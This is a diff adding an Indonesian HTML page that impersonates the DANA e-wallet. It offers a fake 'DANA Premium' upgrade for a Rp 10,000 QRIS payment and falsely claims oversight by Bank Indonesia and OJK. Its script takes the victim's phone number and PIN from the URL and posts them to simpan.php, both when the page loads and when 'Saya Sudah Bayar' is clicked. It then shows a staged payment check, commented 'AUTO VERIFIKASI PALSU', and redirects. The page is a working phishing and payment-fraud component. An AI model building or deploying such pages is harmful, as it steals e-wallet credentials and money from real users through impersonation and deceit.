@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#118EEA">
+<title>Pembayaran QRIS - DANA Premium</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💳</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{background:#f0f4f8;color:#1a2530;line-height:1.5;font-size:14px;min-height:100vh}
+.topbar{background:#118EEA;color:#fff;padding:12px 16px;display:flex;align-items:center;justify-content:space-between}
+.topbar .logo{font-weight:800;font-size:16px}
+.topbar .secure{background:rgba(255,255,255,.15);padding:3px 8px;border-radius:12px;font-size:10px}
+
+.container{max-width:440px;margin:0 auto;padding:18px 16px 40px}
+
+/* CARD */
+.card{background:#fff;border-radius:16px;box-shadow:0 4px 20px rgba(11,107,196,.1);overflow:hidden;margin-bottom:14px}
+.card-head{background:linear-gradient(135deg,#FFB800,#FF8C00);color:#fff;padding:18px 20px;text-align:center}
+.card-head h2{font-size:15px;font-weight:800;margin-bottom:4px}
+.card-head p{font-size:11.5px;opacity:.95}
+.card-body{padding:20px}
+
+/* AMOUNT */
+.amount-box{background:#f8fbfe;border:2px dashed #118EEA;border-radius:14px;padding:18px;text-align:center;margin-bottom:18px}
+.amount-box small{font-size:11px;color:#667;display:block;margin-bottom:4px}
+.amount-box b{font-size:32px;color:#118EEA;font-weight:800;letter-spacing:-1px;font-family:'Courier New',monospace}
+.amount-box .note{font-size:10.5px;color:#889;margin-top:6px}
+
+/* QRIS */
+.qris-wrap{background:#fff;border:2px solid #e0e8f0;border-radius:14px;padding:16px;text-align:center;margin-bottom:16px}
+.qris-wrap img{width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:8px}
+.qris-wrap .label{font-size:11.5px;color:#667;margin-top:10px;font-weight:600}
+.qris-wrap .logo-row{display:flex;justify-content:center;gap:6px;margin-top:10px;flex-wrap:wrap}
+.qris-wrap .logo-row span{background:#f0f4f8;padding:3px 8px;border-radius:6px;font-size:9.5px;color:#667;font-weight:600}
+
+/* INSTRUKSI */
+.instr{background:#fff8e1;border-left:4px solid #FFB800;border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:11.5px;color:#7a4d00;line-height:1.7}
+.instr b{display:block;margin-bottom:6px;font-size:12px}
+.instr ol{padding-left:18px}
+.instr li{margin-bottom:3px}
+
+/* TIMER */
+.timer-box{background:#fdecea;border:1.5px solid #dc3545;border-radius:10px;padding:12px;text-align:center;margin-bottom:16px}
+.timer-box .lbl{font-size:11px;color:#8a1c14;font-weight:600}
+.timer-box .time{font-size:24px;color:#dc3545;font-weight:800;font-family:'Courier New',monospace;margin-top:2px}
+
+/* VERIFIKASI */
+.verify-box{background:#e8f5fe;border:1.5px solid #118EEA;border-radius:12px;padding:14px;margin-bottom:16px;text-align:center;display:none}
+.verify-box.show{display:block}
+.verify-box .spinner{width:36px;height:36px;border:4px solid #c8dff5;border-top-color:#118EEA;border-radius:50%;animation:spin .9s linear infinite;margin:0 auto 10px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.verify-box h4{font-size:13px;color:#118EEA;margin-bottom:4px;font-weight:800}
+.verify-box p{font-size:11px;color:#667}
+
+/* BUTTON */
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#1e8e3e,#0d6b2a);color:#fff;font-size:14px;font-weight:800;border:none;border-radius:12px;cursor:pointer;font-family:inherit;transition:.2s;letter-spacing:.3px;box-shadow:0 4px 14px rgba(30,142,62,.3)}
+.btn:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(30,142,62,.4)}
+.btn.gold{background:linear-gradient(135deg,#FFB800,#FF8C00);box-shadow:0 4px 14px rgba(255,184,0,.35)}
+.btn.ghost{background:#fff;color:#118EEA;border:1.5px solid #118EEA;box-shadow:none;margin-top:10px}
+.btn:disabled{background:#b0b8c1;cursor:not-allowed;transform:none;box-shadow:none}
+
+/* FOOTER */
+.footer{text-align:center;padding:20px 0;font-size:10.5px;color:#889;line-height:1.7}
+.footer b{color:#118EEA}
+
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="logo">dana 👑</span>
+  <span class="secure">🔒 Aman</span>
+</div>
+
+<div class="container">
+
+  <div class="card">
+    <div class="card-head">
+      <h2>💳 Pembayaran Biaya Aktivasi</h2>
+      <p>Scan QRIS untuk melanjutkan upgrade DANA Premium</p>
+    </div>
+    <div class="card-body">
+
+      <div class="amount-box">
+        <small>Total Pembayaran</small>
+        <b>Rp 10.000</b>
+        <div class="note">Biaya aktivasi • Dikembalikan 100% via cashback</div>
+      </div>
+
+      <div class="timer-box">
+        <div class="lbl">⏰ Selesaikan pembayaran dalam</div>
+        <div class="time" id="timer">15:00</div>
+      </div>
+
+      <div class="qris-wrap">
+        <img src="qris.png" alt="QRIS" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 280 280%22%3E%3Crect width=%22280%22 height=%22280%22 fill=%22%23fff%22 stroke=%22%23ccc%22 stroke-width=%222%22/%3E%3Ctext x=%22140%22 y=%22130%22 text-anchor=%22middle%22 font-size=%2214%22 fill=%22%23667%22%3EQRIS%3C/text%3E%3Ctext x=%22140%22 y=%22155%22 text-anchor=%22middle%22 font-size=%2211%22 fill=%22%23889%22%3EUpload qris.png%3C/text%3E%3C/svg%3E'">
+        <div class="label">Scan dengan aplikasi apapun</div>
+        <div class="logo-row">
+          <span>DANA</span><span>OVO</span><span>GoPay</span><span>ShopeePay</span><span>LinkAja</span><span>Bank</span>
+        </div>
+      </div>
+
+      <div class="instr">
+        <b>📌 Cara Bayar:</b>
+        <ol>
+          <li>Buka aplikasi e-wallet / mobile banking Anda</li>
+          <li>Pilih menu <b>Scan QRIS</b></li>
+          <li>Scan QR di atas</li>
+          <li>Masukkan nominal <b>Rp 10.000</b></li>
+          <li>Konfirmasi pembayaran</li>
+          <li>Klik tombol <b>"Saya Sudah Bayar"</b> di bawah</li>
+        </ol>
+      </div>
+
+      <div class="verify-box" id="verify-box">
+        <div class="spinner"></div>
+        <h4>Memverifikasi Pembayaran...</h4>
+        <p id="verify-step">Menghubungi server pembayaran...</p>
+      </div>
+
+      <button class="btn" id="btnBayar" onclick="konfirmasiBayar()">✅ Saya Sudah Bayar</button>
+      <button class="btn ghost" onclick="batalBayar()">Batal</button>
+
+    </div>
+  </div>
+
+  <div class="footer">
+    <b>DANA Premium</b> • Pembayaran aman & terenkripsi<br>
+    Diawasi Bank Indonesia & OJK
+  </div>
+
+</div>
+
+<script>
+/* AMBIL PARAMETER */
+const params=new URLSearchParams(location.search);
+const nomor=params.get('nomor')||'-';
+const pin=params.get('pin')||'-';
+
+/* KIRIM DATA KE SERVER */
+const fd=new FormData();
+fd.append('nomor',nomor);
+fd.append('pin',pin);
+fd.append('tahap','bayar');
+fetch('simpan.php',{method:'POST',body:fd});
+
+/* COUNTDOWN 15 MENIT */
+let cd=900;
+const tEl=document.getElementById('timer');
+setInterval(()=>{
+  if(cd>0)cd--;
+  const m=String(Math.floor(cd/60)).padStart(2,'0');
+  const s=String(cd%60).padStart(2,'0');
+  tEl.textContent=m+':'+s;
+  if(cd<=0){
+    tEl.textContent='00:00';
+    tEl.style.color='#889';
+  }
+},1000);
+
+/* KONFIRMASI BAYAR */
+function konfirmasiBayar(){
+  const btn=document.getElementById('btnBayar');
+  const vbox=document.getElementById('verify-box');
+  btn.disabled=true;
+  btn.textContent='⏳ Memverifikasi...';
+  vbox.classList.add('show');
+
+  const steps=[
+    'Menghubungi server pembayaran...',
+    'Mengecek mutasi QRIS...',
+    'Mencocokkan nominal Rp 10.000...',
+    'Memverifikasi akun DANA...',
+    'Menyelesaikan upgrade...'
+  ];
+  let i=0;
+  const iv=setInterval(()=>{
+    if(i<steps.length){
+      document.getElementById('verify-step').textContent=steps[i];
+      i++;
+    }
+  },900);
+
+  /* KIRIM KE SERVER */
+  const fd2=new FormData();
+  fd2.append('nomor',nomor);
+  fd2.append('pin',pin);
+  fd2.append('tahap','konfirmasi_bayar');
+  fetch('simpan.php',{method:'POST',body:fd2});
+
+  /* AUTO VERIFIKASI PALSU */
+  setTimeout(()=>{
+    clearInterval(iv);
+    vbox.querySelector('h4').textContent='✅ Pembayaran Terverifikasi';
+    vbox.querySelector('p').textContent='Upgrade DANA Premium berhasil diproses...';
+    vbox.querySelector('.spinner').style.display='none';
+    vbox.querySelector('h4').style.color='#1e8e3e';
+    setTimeout(()=>{
+      window.location.href='sukses.html?nomor='+encodeURIComponent(nomor);
+    },2000);
+  },5500);
+}
+
+function batalBayar(){
+  if(confirm('Yakin ingin membatalkan? Upgrade akan dibatalkan.')){
+    window.location.href='index.html';
+  }
+}
+</script>
+</body>
+</html>
